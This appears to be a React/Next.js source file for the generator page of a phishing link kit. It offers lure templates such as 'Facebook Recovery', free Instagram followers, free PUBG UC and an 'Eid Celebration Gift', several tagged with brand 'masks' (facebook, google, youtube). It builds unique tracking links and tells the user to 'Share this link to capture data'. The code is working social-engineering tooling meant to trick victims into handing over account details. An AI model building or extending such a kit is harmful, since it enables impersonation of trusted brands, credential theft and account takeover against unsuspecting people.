"use client";
import { useState } from "react";

export default function GeneratorPage() {
  const templates = [
    { id: "fb-recovery", name: "Facebook Recovery", mask: "facebook", icon: "👤", description: "Account recovery and security check simulation." },
    { id: "ig-followers", name: "Instagram Followers", mask: "instagram", icon: "📸", description: "Free followers and engagement booster." },
    { id: "tiktok", name: "TikTok Booster", mask: "youtube", icon: "🎵", description: "Get viral and increase your view count." },
    { id: "pubg", name: "PUBG Mobile UC", mask: "google", icon: "🔫", description: "Free UC giveaway and skin rewards." },
    { id: "eid-gift", name: "Eid Celebration Gift", mask: "google", icon: "🌙", description: "Special festive rewards and gift cards." },
    { id: "temp-number", name: "Temporary Number", mask: "google", icon: "📱", description: "Get an anonymous temporary number for verifications." }
  ];

  const [selected, setSelected] = useState(null);
  const [generatedLink, setGeneratedLink] = useState("");
  const [copied, setCopied] = useState(false);

  // No more redirection masks as per user request
  const MASKS = {
    direct: ""
  };

  const handleGenerate = () => {
    if (!selected) return;
    const baseUrl = window.location.origin;
    
    // Generate a unique 4-character ID for the link
    const uniqueId = Math.random().toString(36).substring(2, 6);
    
    // Format: domain.com/toolId-uniqueId (e.g., example.com/pubg-82k1)
    const targetUrl = `${baseUrl}/${selected}-${uniqueId}`;
    
    setGeneratedLink(targetUrl);
    setCopied(false);
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(generatedLink);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="main-container animate-fade-in py-6 sm:py-12">
      <header className="mb-8 sm:mb-12">
        <h1 className="text-2xl sm:text-4xl font-bold mb-2 tracking-tight">Link <span className="text-gradient">Generator</span></h1>
        <p className="text-slate-500 text-xs sm:text-sm font-medium">Choose a template to generate your unique tracking link.</p>
      </header>

      <div className="grid grid-cols-2 md:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-6 mb-10 sm:mb-12">
        {templates.map((template) => (
          <div 
            key={template.id} 
            onClick={() => setSelected(template.id)}
            className={`glass-card p-5 sm:p-8 rounded-2xl sm:rounded-3xl cursor-pointer transition-all relative group border-2 sm:border-4 ${selected === template.id ? 'border-indigo-600 bg-indigo-50/50 shadow-lg scale-[1.02]' : 'border-transparent hover:border-slate-200 hover:bg-slate-50'}`}
          >
            {selected === template.id && (
              <div className="absolute top-3 right-3 sm:top-4 sm:right-4 w-6 h-6 sm:w-8 sm:h-8 bg-indigo-600 rounded-full flex items-center justify-center text-white text-[10px] sm:text-xs animate-fade-in shadow-lg">
                ✓
              </div>
            )}
            <div className={`text-2xl sm:text-4xl mb-3 sm:mb-5 transition-transform group-hover:scale-110 ${selected === template.id ? 'scale-110' : ''}`}>{template.icon}</div>
            <h3 className={`text-sm sm:text-xl font-bold mb-1 sm:mb-2 ${selected === template.id ? 'text-indigo-900' : 'text-slate-800'}`}>{template.name}</h3>
            <p className="text-[10px] sm:text-sm text-slate-500 leading-relaxed font-medium line-clamp-2">{template.description}</p>
          </div>
        ))}
      </div>

      <div className="max-w-2xl mx-auto">
        <button 
          onClick={handleGenerate}
          disabled={!selected}
          className={`w-full py-4 sm:py-5 rounded-xl sm:rounded-2xl font-black text-lg sm:text-xl tracking-wide transition-all shadow-xl ${selected ? 'bg-indigo-600 hover:bg-indigo-700 text-white shadow-indigo-500/20 glow-button' : 'bg-slate-100 text-slate-300 cursor-not-allowed border border-slate-200'}`}
        >
          {selected ? 'Create My Link Now' : 'Select a Category Above'}
        </button>

        {generatedLink && (
          <div className="mt-8 sm:mt-10 p-6 sm:p-8 glass-card rounded-[1.5rem] sm:rounded-[2rem] border-indigo-200 animate-fade-in bg-indigo-50/50 shadow-inner relative overflow-hidden">
            {copied && (
              <div className="absolute top-0 left-0 w-full h-1 bg-indigo-600 animate-[progress_2s_linear]"></div>
            )}
            <div className="flex items-center justify-between mb-4">
              <p className="text-[10px] font-black text-indigo-600 uppercase tracking-[0.2em]">Your Link is Ready</p>
              {copied && (
                <span className="text-[9px] font-black text-emerald-600 bg-emerald-100 px-2 sm:px-3 py-1 rounded-full animate-fade-in border border-emerald-200 flex items-center gap-1">
                  Copied ✨
                </span>
              )}
            </div>
            <div className="flex flex-col sm:flex-row items-center gap-3 sm:gap-4">
              <input 
                type="text" 
                readOnly 
                value={generatedLink} 
                className="w-full bg-white border-2 border-slate-100 rounded-xl sm:rounded-2xl px-5 sm:px-6 py-3.5 sm:py-4 text-xs sm:text-sm font-bold font-mono text-slate-700 outline-none focus:border-indigo-400 shadow-sm"
              />
              <button 
                onClick={copyToClipboard}
                className={`w-full sm:w-auto px-6 sm:px-8 py-3.5 sm:py-4 font-black rounded-xl sm:rounded-2xl transition-all shadow-lg active:scale-95 flex items-center justify-center gap-2 ${copied ? 'bg-emerald-500 text-white shadow-emerald-200' : 'bg-slate-900 text-white shadow-black/10 hover:bg-slate-800'}`}
              >
                {copied ? 'Done ✓' : 'Copy'}
              </button>
            </div>
            <p className="text-[9px] text-slate-400 mt-4 text-center font-bold uppercase tracking-widest">Share this link to capture data</p>
          </div>
        )}
      </div>
    </div>
  );
}
